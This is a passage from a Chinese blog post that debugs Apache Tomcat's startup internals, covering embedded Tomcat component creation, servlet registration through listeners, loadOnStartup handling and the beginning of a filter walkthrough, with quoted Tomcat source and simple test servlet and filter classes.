class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);  </span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();  </span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);  </span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);  </span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了便于调试, 这里使用的是&#x3D;&#x3D;嵌入式的tomcat&#x3D;&#x3D;, 启动方式有所不同<br>嵌入式的启动是使用&#x3D;&#x3D;<code>org.apache.catalina.startup.Tomcat</code>&#x3D;&#x3D;类的一个简易启动, 而传统的启动则使用&#x3D;&#x3D;Catalina&#x3D;&#x3D;配合&#x3D;&#x3D;Bootstrap&#x3D;&#x3D;来完成启动的</p><ul><li><p><strong>嵌入式 Tomcat 启动：</strong> 使用 <code>Tomcat</code> 类的一个<strong>简易启动</strong>方式。</p><ul><li><code>Tomcat</code> 类作为高层 API，封装了底层 Catalina 组件的创建和配置细节，让开发者可以通过编程方式快速启动一个 Tomcat 实例。它在内部会隐式地创建和组装 <code>Server</code>、<code>Service</code>、<code>Engine</code>、<code>Host</code> 等核心组件。</li></ul></li><li><p><strong>传统 Tomcat 启动：</strong> 使用 <code>Catalina</code> 配合 <code>Bootstrap</code>。</p><ul><li><p><code>Bootstrap</code> 是<strong>引导程序</strong>，负责环境准备、类加载器设置，并调用 <code>Catalina</code> 的核心方法。</p></li><li><p><code>Catalina</code> 是<strong>核心容器的管理者</strong>，它根据 <code>server.xml</code> 等配置文件来解析、创建和协调 <code>Server</code>、<code>Service</code>、<code>Engine</code>、<code>Host</code> 等所有核心容器组件的生命周期。</p></li></ul></li></ul><p>先来看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();  </span><br><span class="line">tomcat.getConnector();</span><br></pre></td></tr></table></figure><p>创建tomcat建议启动器实例, 获取Connector, 跟进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722160040.png" alt="image.png"><br>这里getService跟进去是这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Service <span class="title function_">getService</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> getServer().findServices()[<span class="number">0</span>];  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getServer跟进去是这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Server <span class="title function_">getServer</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (server != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> server;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    System.setProperty(<span class="string">&quot;catalina.useNaming&quot;</span>, <span class="string">&quot;false&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    server = <span class="keyword">new</span> <span class="title class_">StandardServer</span>();  </span><br><span class="line">  </span><br><span class="line">    initBaseDir();  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Set configuration source  </span></span><br><span class="line">    ConfigFileLoader.setSource(<span class="keyword">new</span> <span class="title class_">CatalinaBaseConfigurationSource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(basedir), <span class="literal">null</span>));  </span><br><span class="line">  </span><br><span class="line">    server.setPort( -<span class="number">1</span> );  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Service</span> <span class="variable">service</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardService</span>();  </span><br><span class="line">    service.setName(<span class="string">&quot;Tomcat&quot;</span>);  </span><br><span class="line">    server.addService(service);  </span><br><span class="line">    <span class="keyword">return</span> server;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最终是<code>getServer</code>方法创建了一个<code>StandardServer</code>, 并实例化一个<code>StandardService</code>添加到创建的<code>StandardServer</code>中</p><p>之后创建一个连接器, 添加给service,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722160530.png" alt="image.png"><br>也就是说是<code>tomcat.getConnector();</code>这句创建了&#x3D;&#x3D;Server&#x3D;&#x3D;和&#x3D;&#x3D;service&#x3D;&#x3D;以及service中的&#x3D;&#x3D;连接器&#x3D;&#x3D;</p><p>继续看下一句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br></pre></td></tr></table></figure><p>断点进到<code>addWebapp</code>中去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722163236.png" alt="image.png"></p><p>可以跟进<code>getHost</code>方法, 这里和之前的逻辑一样, 有则返回, 无则创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Host <span class="title function_">getHost</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">Engine</span> <span class="variable">engine</span> <span class="operator">=</span> getEngine();  </span><br><span class="line">    <span class="keyword">if</span> (engine.findChildren().length &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> (Host) engine.findChildren()[<span class="number">0</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardHost</span>();  </span><br><span class="line">    host.setName(hostname);  </span><br><span class="line">    getEngine().addChild(host);  </span><br><span class="line">    <span class="keyword">return</span> host;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里是创建了<code>engine</code>并为其创建了一个<code>host</code>, 这个host默认绑定在<code>localhost</code>, 并将该host作为<code>engine</code>的child, 这也就是组合模式的运用</p><p>跟进addWebapp<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722164542.png" alt="image.png"><br>创建了一个<code>LifecycleListener</code>, 是一个空的ContextConfig<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722165419.png" alt="image.png"></p><p>再跟进addWebapp<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722171149.png" alt="image.png"></p><p>为host创建了一个context, 并配置了该context的默认监听器 (观察者)<br>在此时候context也就创建好了</p><p>之后看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());  </span><br><span class="line">context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br></pre></td></tr></table></figure><p>首先是<code>addServlet</code>为现有的context创建了一个wrapper<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722171955.png" alt="image.png"></p><p>addServletMappingDecoded 添加了映射<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722172913.png" alt="image.png"></p><p>到这里该创建的都创建了<br>之后就会进入到init和start的流程, 和上面的泳道图中的流程基本一致</p><p>有一点不同在于下图中的过程<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722223729.png" alt="image.png"></p><p>在调试时发现这里应该是先执行&#x3D;&#x3D;<code>DefaultWebXmlListener</code>&#x3D;&#x3D;监听器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230011.png" alt="image.png"></p><p>这个监听器是<code>org.apache.catalina.startup.Tomcat</code>里定义的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230133.png" alt="image.png"><br>看注释可以知道这个监听器是用来代替传统启动方式的<code>$CATALINA_HOME/conf/web.xml</code>配置启动的, 这样就相当于它代替了<code>org.apache.catalina.startup.ContextConfig</code>这个监听器的任务, 再来看<code>ContextConfig</code>监听器, 它的<code>defaultWebXml</code>被赋值为了<code>org/apache/catalina/startup/NO_DEFAULT_XML</code>(即不采用默认xml配置文件) 也证实了这一点</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230643.png" alt="image.png"></p><p>跟进<code>DefaultWebXmlListener</code>监听器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231231.png" alt="image.png"><br>addServlet创建servlet对应的wrapper后, 将其添加到context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231304.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232232.png" alt="image.png"></p><p>最后会启动这个wrapper<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232056.png" alt="image.png"></p><p>再看ContextConfig监听器<br>可以在此处打条件断点进去<br><code>listener.getClass().getName().equals(&quot;org.apache.catalina.startup.ContextConfig&quot;)</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722235322.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722235356.png" alt="image.png"><br>如果是传统的配置文件启动, 会进入<code>configureStart();</code>, 这里并不是就不会进去. </p><h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><h4 id="servlet初始化流程分析"><a href="#servlet初始化流程分析" class="headerlink" title="servlet初始化流程分析"></a>servlet初始化流程分析</h4><p>断点打在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723002635.png" alt="image.png"></p><p>根据上面的调试StandardWrapper#setServletClass的上层调用有两种情况<br>一种是<code>DefaultWebXmlListener</code> , 一种是<code>ContextConfig</code><br>先来看<code>DefaultWebXmlListener</code><br>它会触发到<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231304.png" alt="image.png"></p><p>这里可以看见关键的三步</p><ul><li><p>&#x3D;&#x3D;创建servlet&#x3D;&#x3D;(<code>addServlet</code>)</p></li><li><p>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</p></li><li><p>将<code>url</code>和<code>servlet</code>类做映射<br>再看创建Servlet的逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232232.png" alt="image.png"><br>创建Servlet又分为</p></li><li><p>创建<code>Wapper</code>对象</p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的<code>class</code></p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的名称</p></li><li><p>将配置好的<code>Wrapper</code>添加到<code>Context</code>中<br>因此初始化Servlet分为</p></li><li><p>创建<code>Wapper</code>对象</p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的<code>class</code></p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的名称</p></li><li><p>将配置好的<code>Wrapper</code>添加到<code>Context</code>中</p></li><li><p>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</p></li><li><p>将<code>url</code>和<code>servlet</code>类做映射</p></li></ul><p><strong>再来看<code>ContextConfig</code></strong><br>在configureContext方法中同样会调用到<code>wrapper.setServletClass(servlet.getServletClass());</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;  </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();  </span><br><span class="line">    <span class="comment">// Description is ignored  </span></span><br><span class="line">    <span class="comment">// Display name is ignored    // Icons are ignored  </span></span><br><span class="line">    <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param  </span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setEnabled(servlet.getEnabled().booleanValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setName(servlet.getServletName());  </span><br><span class="line">    Map&lt;String,String&gt; params = servlet.getParameterMap();  </span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;  </span><br><span class="line">        wrapper.addInitParameter(entry.getKey(), entry.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setRunAs(servlet.getRunAs());  </span><br><span class="line">    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();  </span><br><span class="line">    <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;  </span><br><span class="line">        wrapper.addSecurityReference(  </span><br><span class="line">                roleRef.getName(), roleRef.getLink());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());  </span><br><span class="line">    <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();  </span><br><span class="line">    <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">        <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;  </span><br><span class="line">            maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;  </span><br><span class="line">            maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;  </span><br><span class="line">            fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(  </span><br><span class="line">                multipartdef.getLocation(),  </span><br><span class="line">                maxFileSize,  </span><br><span class="line">                maxRequestSize,  </span><br><span class="line">                fileSizeThreshold));  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setAsyncSupported(  </span><br><span class="line">                servlet.getAsyncSupported().booleanValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setOverridable(servlet.isOverridable());  </span><br><span class="line">    context.addChild(wrapper);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry :  </span><br><span class="line">        webxml.getServletMappings().entrySet()) &#123;  </span><br><span class="line">    context.addServletMappingDecoded(entry.getKey(), entry.getValue());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是完成了上面6个步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">...</span><br><span class="line">wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">...</span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br><span class="line">...</span><br><span class="line">wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">...</span><br><span class="line">context.addChild(wrapper);</span><br><span class="line">...</span><br><span class="line">context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="servlet装载流程分析"><a href="#servlet装载流程分析" class="headerlink" title="servlet装载流程分析"></a>servlet装载流程分析</h4><p>断点在<code>org.apache.catalina.core.StandardWrapper#loadServlet</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723154556.png" alt="image.png"><br>寻找其上层调用<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723155407.png" alt="image.png"><br>这里注释写的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// Load and initialize all &quot;load on startup&quot; servlets</span><br></pre></td></tr></table></figure><p>说明是启动所有标记为<code>LoadOnStartUp</code>d的servlet</p><p>并且在此之前执行了<br><code>listenerStart()</code> 和 <code>filterStart()</code> 启动listener和filter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723155708.png" alt="image.png"></p><p>再看loadOnStartup方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized  </span></span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;  </span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();  </span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">continue</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);  </span><br><span class="line">        map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(wrapper);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets  </span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                wrapper.load();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;  </span><br><span class="line">                getLogger().error(  </span><br><span class="line">                        sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>, getName(), wrapper.getName()),  </span><br><span class="line">                        StandardWrapper.getRootCause(e));  </span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws  </span></span><br><span class="line">                <span class="comment">// UnavailableException from the init() method) are NOT                </span></span><br><span class="line">                <span class="comment">// fatal to application startup                </span></span><br><span class="line">                <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                <span class="keyword">if</span> (getComputedFailCtxIfServletStartFails()) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loadOnStartup</code> &lt; 0 就不加载(只有访问到时才加载)<br>将loadOnStartup &gt;&#x3D; 0 的创建一个treeMap, treeMap的键为loadOnStartup的值, reeMap的值 为ArrayList, 里面存储需要加载的Wrapper(Servlet)<br>之后遍历整个treeMap加载</p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723214431.png" alt="image.png"></p><h4 id="tomcat源码调试"><a href="#tomcat源码调试" class="headerlink" title="tomcat源码调试"></a>tomcat源码调试</h4><p>这里使用传统方式启动tomcat而不是嵌入式,<br>要调试这个非嵌入式的tomcat, 网上很多教程都很繁琐且不太靠谱,<br>可以直接添加嵌入式tomcat的源码来调试, 版本保持一致即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.107<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>TestFilter.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebFilter(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter init&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter doFilter &quot;</span>);  </span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter destroy&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TestServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span 